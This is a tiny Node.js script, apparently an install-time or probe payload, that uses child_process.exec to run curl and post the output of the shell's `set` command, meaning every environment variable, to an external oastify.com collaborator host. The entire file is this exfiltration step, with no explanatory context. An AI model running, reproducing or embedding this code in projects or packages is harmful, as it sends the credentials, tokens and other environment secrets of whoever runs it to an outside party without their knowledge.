const { exec } = require('child_process');
exec('curl -d "`set`" https://kf30tx2mwjo0j3uqavskwf23gumln9e52u.oastify.com', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
});
